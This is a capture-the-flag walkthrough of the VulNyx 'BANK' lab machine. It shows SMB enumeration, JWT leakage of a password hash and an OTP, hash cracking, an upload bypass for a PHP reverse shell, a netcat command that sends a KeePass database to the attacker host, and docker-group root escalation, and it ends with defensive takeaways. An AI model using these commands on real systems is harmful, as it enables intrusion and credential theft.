# [VulNyx](https://vulnyx.com/): BANK Writeup

<img width="671" height="426" alt="image" src="https://github.com/user-attachments/assets/9b4db2b3-4119-4c80-83f6-b70d05cde7c8" />

---

# 🎯 Target Information

- **Platform:** VulNyx.com
- **Machine Name:** BANK
- **Key Vulnerabilities:**
  - SMB Anonymous Share Access
  - Information Disclosure
  - JWT Information Leakage
  - Weak Administrative Credentials
  - File Upload Bypass
  - Remote Code Execution (RCE)
  - KeePass Credential Exposure
  - Docker Group Privilege Escalation

---

# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```text
$ sudo arp-scan  --localnet
[sudo] password for arc: 
Sorry, try again.
[sudo] password for arc: 
Sorry, try again.
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 172.29.112.76
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.29.112.109  fe:f7:e9:58:e3:54       (Unknown: locally administered)
172.29.112.122  62:70:c1:a1:26:26       (Unknown: locally administered)
172.29.112.170  00:0c:29:09:d5:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.098 seconds (122.02 hosts/sec). 3 responded
```

The target machine IP address was identified as:

```text
172.29.112.170
```

---

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sS -p- --min-rate 5000 172.29.112.170
```

## Scan Results

```text
$ nmap -n -Pn -sS  -p- --min-rate 5000   172.29.112.170
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 02:00 -0700
Nmap scan report for 172.29.112.170
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:09:D5:97 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.29 seconds
```

### Findings

- Port **80** → HTTP
- Port **139** → NetBIOS
- Port **445** → SMB

The SMB service appeared particularly interesting and was selected for further enumeration.

---

# 🌐 Web Enumeration

Opening the website redirected the browser to:

```text
http://bank.nyx
```

Since the domain could not be resolved, add it to the `/etc/hosts` file:

```text
172.29.112.170 bank.nyx
```

After refreshing the page, the **Bank Alpha** website loaded successfully.

### Observation

A notice on the homepage stated:

```text
🚀 Coming Soon: Bank Alpha Public Launch Q3 2026
```

This suggested that the application was still under development and might contain security misconfigurations.

---

# 📂 Directory Enumeration

Use Gobuster to search for hidden directories:

```bash
gobuster dir -u http://bank.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Result

```text$ gobuster dir -u http://bank.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
server-status        (Status: 403) [Size: 313]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

No additional directories were discovered.

---

# 🔍 SMB Enumeration

Enumerate SMB shares anonymously:

```bash
smbclient -L //172.29.112.170/ -N
```

## Result

```text
$ smbclient -L //172.29.112.170/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        development     Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u1)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.29.112.170 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

### Important Finding

An anonymous SMB share named:

```text
development
```

was accessible.

---

# 📥 Accessing the SMB Share

Connect to the share:

```bash
smbclient //172.29.112.170/development -N
```
Download the file:

```bash
mget *
```
List files:

```bash
$ smbclient //172.29.112.170/development -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May  3 03:43:20 2026
  ..                                  D        0  Sun May  3 03:43:20 2026
  03-may-26.txt                       N     1141  Sun May  3 03:43:20 2026

                9627844 blocks of size 1024. 6209724 blocks available

smb: \> mget *
Get file 03-may-26.txt? y
getting file \03-may-26.txt of size 1141 as 03-may-26.txt (31.0 KiloBytes/sec) (average 31.0 KiloBytes/sec)
smb: \> 
```

Download the file:

```bash
mget *
```

---

# 📄 Information Disclosure

Reading the contents of `03-may-26.txt` revealed:

```text
Subject: AI Agent Integration & Development Environment Setup

To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
For this reason, it is important to maintain strict attention to security and validate all critical operations.

A dedicated development directory has been enabled where developers can access and test the application.
Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174

Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
to ensure everything is properly configured.

Best regards,
Marcelo
```

### Important Finding

A development directory was disclosed:

```text
development-0119-d5e051a-9da2-12sdas1-775-e0174
```

Navigate to:

```text
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174
```

A login and registration portal was discovered.

---

# 🔐 Account Registration

Register a new account and Login to the application.
| Register | Login |
|---|---|
| <img width="1920" height="1080" alt="Screenshot_2026-05-29_02_19_29" src="https://github.com/user-attachments/assets/76aa8011-58db-4595-b77c-b9e23d66ea86" /> | <img width="1920" height="1080" alt="Screenshot_2026-05-29_02_20_48" src="https://github.com/user-attachments/assets/6f9bc51d-8838-4243-9b44-2489d0bb0b07" /> |

After logging in, navigate through the Summary section and identify the account verification feature.

Testing the username:

```text
admin
```
<img width="1920" height="764" alt="Screenshot_2026-05-29_02_22_17" src="https://github.com/user-attachments/assets/c50f471d-59fb-4eb0-a129-0e58a9673ae8" />

confirmed that the administrator account exists.

---

# 🔍 JWT Analysis

Capture the verification Response using Burp Suite.
Inspect the JWT token using the [JWT-Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) extension.
<br><br>
<img width="1225" height="477" alt="Screenshot_2026-05-30_01_38_12" src="https://github.com/user-attachments/assets/6b693302-dcbb-479f-b683-2153289ef799" />

<img width="1539" height="698" alt="Screenshot_2026-05-29_02_25_49" src="https://github.com/user-attachments/assets/80050b18-52c9-4f8d-bd7d-1e4c98234004" />

### Important Finding

The JWT token contained:

- Username : admin
- Password hash : ``` $2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi```
  

for the administrator account.

---

# 🔓 Password Cracking

Extract the bcrypt hash and crack it using John the Ripper:

```bash
john --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Result

```text
$ john --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (?)     
1g 0:00:00:05 DONE (2026-05-30 01:50) 0.1901g/s 41.06p/s 41.06c/s 41.06C/s peanut..jessie
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Administrator Credentials

```text
Username: admin
Password: blink182
```

---

# 🔐 OTP Disclosure

Login as the administrator using the Credentials .

<img width="1920" height="695" alt="Screenshot_2026-05-29_02_55_29" src="https://github.com/user-attachments/assets/24d73953-8183-453e-892d-dc94f7c706e7" />

The application requested a One-Time Password (OTP).

Capture the request using Burp Suite and inspect the JWT token.

<img width="1545" height="535" alt="Screenshot_2026-05-29_02_58_58" src="https://github.com/user-attachments/assets/51ebe9e0-1db1-4097-bb84-cb3680b63d62" />

### Important Finding

The JWT payload contained:

```text
otp = 540294
```

Enter the OTP and successfully authenticate as the administrator.

---

# 📤 File Upload Bypass

The administrator panel contained a profile update feature that allowed file uploads.

<img width="1918" height="783" alt="Screenshot_2026-05-30_02_36_16" src="https://github.com/user-attachments/assets/c47db28d-6b8c-43fa-bec1-37669bd77a86" />

```text
Only JPG, JPEG, and PNG files are allowed.
```
Get the  PHP reverse shell from the  https://www.revshells.com/ of "PHP PentestMonkey" and save to a file.
Upload the PHP reverse shell.

Capture the upload request in Burp Suite.

<img width="3000" height="1500" alt="MixCollage-30-May-2026-09-07-PM-6937" src="https://github.com/user-attachments/assets/f7c7291e-8086-47c0-ac5b-67eed90c8f8c" />

Original header:

```http
Content-Type: application/x-php
```

Modify it to:

```http
Content-Type: image/png
```

Forward the request.

<img width="1920" height="617" alt="Screenshot_2026-05-29_03_02_45" src="https://github.com/user-attachments/assets/672c978f-2fe8-4223-9417-5aa9da60f1a4" />

Although the application returned a **500 Internal Server Error**.

---

# 🔍 Uploaded File Discovery

Inspect subsequent requests and identify the uploads directory:

<img width="658" height="454" alt="Screenshot_2026-05-29_03_04_59" src="https://github.com/user-attachments/assets/2fbccaf6-a42e-4f8e-9b22-f1e95cf37e4c" />
<br><br>

```text
/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/
```

Navigate to the directory.

<img width="1920" height="613" alt="Screenshot_2026-05-29_03_09_53" src="https://github.com/user-attachments/assets/9cfdd2cf-745f-469a-ad18-f0d63cee75f6" />

The PHP reverse shell file was uploaded successfully.

---

# 🎧 Netcat Listener

Start a listener on the attacker machine:

```bash
nc -lvnp 443
```

---

# 🚀 Remote Code Execution

Trigger the uploaded PHP reverse shell.

## Result

```bash
$ nc -lnvp 443
listening on [any] 443 ...
connect to [172.29.112.76] from (UNKNOWN) [172.29.112.170] 57018
Linux bank 6.12.85+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.85-1 (2026-04-30) x86_64 GNU/Linux

```
Successfully obtained a reverse shell as:

---

# 🔧 Upgrading the Shell

Spawn a Bash shell:

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Configure the terminal:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The shell is now fully interactive.

---

# 🔍 Sensitive Files Discovery

While enumerating directories, the following files were discovered:

```bash
www-data@bank:/srv/smb/passwords$ ls
note.txt  passwords.kdbx
```

Read the note.txt:

```bash
cat note.txt
```

## Result

```text
Hey, as you said Marcelo, I’ve already left a KeePass file with all the system passwords you asked me to create, except for the root password. 
The KeePass password is: `@zm{2h8aUu'a_M;'Jd:!MAQ?zn

Delete it after reading, but don’t worry-I think I’ve configured this directory properly so only you can access 
it, and it’s not exposed on the SMB service either.: Juan

```

### Important Finding

The KeePass master password was disclosed.

---

# 📥 Retrieving the KeePass Database

Transfer the database to the attacker machine.

## On Target

```bash
nc 172.29.112.76 4444 < passwords.kdbx
```

## On Attacker

```bash
nc -lvnp 4444 > passwords.kdbx
```

Open the database using **KeePassXC**.
To Install
```
sudo apt install keepassxc
```
To Open
```
keepassxc passwords.kdbx
```
<img width="805" height="497" alt="Screenshot_2026-05-29_03_22_40" src="https://github.com/user-attachments/assets/13c02173-7152-4a53-9a2d-a419e8f517d9" />

Enter the password:

```text
`@zm{2h8aUu'a_M;'Jd:!MAQ?zn
```

### Important Finding

Credentials for the user **marcelo** were stored in the database.

<img width="1083" height="594" alt="Screenshot_2026-05-29_03_23_32" src="https://github.com/user-attachments/assets/a2132063-c9dc-4552-81de-26dde21fca2d" />

```text
Username: marcelo
Password: m4rC1!#asl2#vsHj4!
```

---

# 🖥 User Access

Switch to the Marcelo account:

```bash
su - marcelo
```
Enter the password.

Verify access:

```bash
hostname ; id
```

## Result

```bash
 marcelo@bank:/srv/smb/passwords$ hostname ;id
bank
uid=1000(marcelo) gid=1000(marcelo) groups=1000(marcelo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),105(docker)
```

### Important Finding

The user belongs to the:

```text
docker
```

group.

---

# 📄 User Flag

```bash
cat /home/marcelo/user.txt
52728f2b72b6a153a415d8***********
```

---

# 🚀 Privilege Escalation via Docker

Enumerate available Docker images:

```bash
docker images
```

## Result

```text
marcelo@bank:/srv/smb/passwords$ docker images
REPOSITORY   TAG             IMAGE ID       CREATED       SIZE
debian       bookworm-slim   865980b94764   5 weeks ago   74.8MB
```

Since the user belongs to the Docker group, a container can be used to mount the host filesystem and obtain root access.

Execute:

```bash
docker run -v /:/host -it --rm debian:bookworm-slim chroot /host bash
```

---

# 👑 Root Access

Verify privileges:

```bash
marcelo@bank:/srv/smb/passwords$ docker run -v /:/host -it --rm debian:bookworm-slim chroot /host bash
root@d9a79b7c88f0:/# id ;
uid=0(root) gid=0(root) groups=0(root)
root@d9a79b7c88f0:/# 
```

Successfully escalated privileges to root.

---

# 🏁 Root Flag

```bash
root@d9a79b7c88f0:/# find / -type f -name root.txt 2>/dev/null
/root/root.txt
root@d9a79b7c88f0:/# cat /root/root.txt
e8bd8213ff4f6b805dec90**********
root@d9a79b7c88f0:/# 
```

---

# 🧾 Summary

| Phase | Technique |
|---------|------------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| SMB Enumeration | Anonymous Share Access |
| Information Disclosure | Development Notes |
| Web Exploitation | JWT Analysis |
| Credential Recovery | Hash Cracking |
| Authentication Bypass | OTP Disclosure |
| Remote Code Execution | File Upload Bypass |
| Credential Harvesting | KeePass Database |
| Privilege Escalation | Docker Group Abuse |
| Root Access | Host Filesystem Mount |

---

# 🚀 Key Takeaways

- Anonymous SMB shares can expose sensitive development information.
- JWT tokens should never contain passwords or password hashes.
- Client-side file validation is not sufficient for upload security.
- Sensitive password databases should never be stored alongside plaintext credentials.
- Membership in the Docker group effectively grants root-level access to the host.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
